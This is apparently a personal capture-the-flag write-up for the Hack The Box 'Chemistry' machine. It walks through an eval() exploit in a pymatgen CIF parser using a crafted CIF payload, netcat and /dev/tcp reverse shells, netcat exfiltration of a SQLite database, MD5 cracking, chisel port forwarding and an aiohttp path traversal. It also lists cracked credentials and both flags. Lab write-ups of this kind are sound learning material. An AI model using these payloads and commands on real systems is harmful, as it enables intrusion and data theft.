### Quick reference information:
- My IP: `10.10.14.9`
- Target IP: `10.10.11.38`
- My website credentials:
	- Username: `gamer123`
	- Password: `gamer123`
- User info:
	- Username: `rosa`
	- Password: `unicorniosrosados`
- User flag:
	- `60b2a331594cc6c5f9ca897e4ffda69b`
- Root flag:
	- `98c3d5c0b41b7070f5077040f19e989b`

### Enumeration
- Results from `nmap` seem pretty standard, I might want to try more ports later on, though: 
```a
[lkotlus@work] [~/Nerd/htb/chemistry] [09:45 PM]  
> sudo nmap -sV 10.10.11.38  
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-09 21:46 EST  
Nmap scan report for 10.10.11.38  
Host is up (0.016s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```
- Let's check out this website (and this strange `httpd` service)

### Website
- Default route is a login page.
- The idea is that it is a CIF (Crystallographic Information File) Analyzer. Users upload a file and it analyzes it for us.
- This sounds like (assuming it isn't a basic exploit on the hosting service) a very basic evil file upload.
- Let's see if I can register an account!
	- I can!
- Let's try uploading a php file ([this, as always](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))
- I try uploading the file (`evil.php`) and get redirected to a 405 (Method Not Allowed) page. Cringe.
- Let's try changing the file extension to CIF.
	- Upload works!
	- Viewing the file doesn't work!
	- Unfortunate.
	- Just to double check, let's listen and view the file:  
```a
[lkotlus@work] [~/Nerd/htb/chemistry] [09:59 PM]  
> sudo nc -lvp 4206
...
```
- Nothing! I might need to look at how CIF files work. Perchance there is an easy way to inject something malicious into them. For now, let's take a look at the web service.

### Werkzeug httpd 3.0.3
- The first thing we know is that this is using Python 3.9.5. I know how to use Python, so if there's an attack involving that I should be good.
- There's one on versions 0.10 and older for the debug console, seems like the wrong track.
- Let's keep going with this CIF file lead.

### CIF stuff
- These things are a custom formatted file format with syntax similar to just setting up variables in a programming language.
- They set up relationships for chemistry crap that I honestly couldn't care less about.
- With an example file from the web, we can actually upload the file and have it work properly. Very nice!
- Opening the file in VSCode, it's pretty readable.
- 790 lines of this... unfortunate.
- I copied it to a new file and tried putting a little something something in it rather than data. Completely failed.
- Let's check the web for some known exploits with such files.
	- It looks like there's [an exploit against CIF files with pymatgen](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f). The server must be running some Python according to the `nmap` scan, so this is promising.
- Reading about how the exploit works:
	- So apparently a vulnerable part of the code uses `eval()` (amateurs) for something.
	- This gives us ACE, which is pretty noice. I should be able to get a Python reverse shell one-liner and be done.
	- My payload shall be:
		- `nc 10.10.14.9 4206 -e /bin/bash`
		- Pretty sick!
- Let's assemble a CIF payload and get to it!
```a
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("nc 10.10.14.9 4206 -e /bin/bash");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
- This ought to do it.
	- Listening with `nmap -lvp 4206`...
	- Uploading the file...
	- Viewing...
	- INTERNAL SERVER ERROR!!!! Damn.
	- It was so promising!!!!
- This isn't the end, though. I'll try again with the vanilla payload.
	- Still an error.
- Well... let's look at some other exploits.
	- There aren't any.
- Crap. This mainly stems from a lack of information about the technology being used in the backend to support all of the CIF parsing.
- Then again, the exploit is so recent and specific to a Python-based CIF parser, it feels as if (metagaming lmao) that this MUST be the one that I should be going for!
- Could it be that netcat simply isn't installed? Feels like that couldn't possibly be the issue.
- A walkthrough (so far) shows that I am absolutely on the right track!
- The issue seems to be my payload choice. Damn it.
	- New payload: `/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.9/4206 0>&1\'`
	- This is really good for machines that might not have any real software installed.
	- Let's try it out! (I cancel the single quotes for python purposes)
	- WE ARE IN BUSINESS!
- I'm in (as the `app` user).
- Now just time for some...

### Priv esc (user)
- I see a SQLite database file. I want.
- Let's try to figure out a way to get this to my machine without putting a railroad spike through my skull.
	- First I tried the certified hood classic `python3 -m http.server 80`, but that is decidedly not allowed.
	- I could try to just put this file on the webserver. That would be funny.
	- Wait a minute... netcat exists! 
		- Victim machine: `nc 10.10.14.9 4444 -w 3 < database.db`
		- My machine: `nc -lvp 4444 > database.db`
		- And... it works!
- Let's convert this to CSV and see if we can get a password.
- User's name is `rosa`, so if there's a user by that name on the website I should be able to go for some password cracking stuff.
- Convert to CSV with [this tool](https://github.com/darrentu/convert-db-to-csv/blob/master/convert-db-to-csv.sh).
- Boom! The hash for the `rosa` user is: `63ed86ee9f624c7b14f1d4f43dc251a5`.
- Let's try out crack station.
	- THEY ARE USING MD5 LMAO!
	- `rosa:unicorniosrosados`
- Now I can `ssh` into a real environment (assuming she reuses passwords).
	- I am almost too good at this.
- Admin password wasn't found on crack station, I would assume that this isn't the way I'll get it either way.
- User flag!

### Priv esc (root)
- Time to really get this bread.
- We're running Ubuntu 20.04 (oh, I remember those days...)
- I see something called `lxd` (virtualization software made by Canonical) and `_laurel`. 
- Really, I should have listened to those `netstat` results that I saw a bit ago instead of going on wild goose chases. Let's port forward 8080 to see some cool stuff.
	- Let's revisit our friend `chisel` to do this.
	- My machine: `chisel server -p 9999 --reverse`
	- Victim: `chisel client [my ip]:9999 R:80:127.0.0.1:8080`
	- Getting the chisel client to the victim is an easy process, just run: `wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz; gunzip chisel_1.10.1_linux_386.gz; scp chisel_1.10.1_linux_386 user@ip:/home/user/chisel`
	- "So easy and convenient"
- Lovely! We have some sort of monitoring/metrics site.
- Let's hit ourselves with an `nmap -sV -p 8080 localhost`
	- Result is `8080/tcp open  http    aiohttp 3.9.1 (Python 3.9)`
- Let's look for exploits:
	- [Path traversal](https://github.com/z3rObyte/CVE-2024-23334-PoC)
	- Not much else...
- Just within the website, I can see that the `Start service` button re-copies all of the information to the `List services` page. It says that it doesn't do anything, but it seems as if it actually does do something.
- I wonder if I can get it to do whatever I want...
- There's a `/list_services` endpoint. That's interesting.
	- It's just the `service --status-all` output.
- Dead end. Found a walkthrough and got a hint. I was getting somewhere with the path traversal. Apparently I needed to have `/assets` instead of `/static`. Sucks to suck.
- I can read any file with this. Can I read the flag file?
- Yes! I can ready everything.
	- Pwned: `98c3d5c0b41b7070f5077040f19e989b`
- I might've supposed to have dumped the shadow file, but this was faster and easier.